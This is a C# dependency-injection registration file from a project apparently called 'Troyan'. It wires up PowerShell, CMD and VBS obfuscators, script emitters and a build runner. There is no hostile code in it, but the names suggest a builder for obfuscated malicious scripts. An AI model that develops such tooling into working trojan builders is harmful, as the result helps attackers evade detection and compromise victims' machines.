using Microsoft.Extensions.DependencyInjection;

namespace Troyan.Core;

public static class ServiceCollectionExtensions
{
    public static IServiceCollection AddTroyanCore(this IServiceCollection services)
    {
        services.AddSingleton<IPowerShellObfuscator, PowerShellObfuscator>();
        services.AddSingleton<ITroyanCmdObfuscator, TroyanCmdObfuscator>();
        services.AddSingleton<ITroyanVbsObfuscator, TroyanVbsObfuscator>();
        services.AddSingleton<ITroyanPlainVbsEmitter, TroyanPlainVbsEmitter>();
        services.AddSingleton<ITroyanPlainCmdEmitter, TroyanPlainCmdEmitter>();
        services.AddSingleton<ITroyanBuildRunner, TroyanBuildRunner>();
        services.AddSingleton<ITroyanBuildCoordinator, TroyanBuildCoordinator>();
        return services;
    }
}
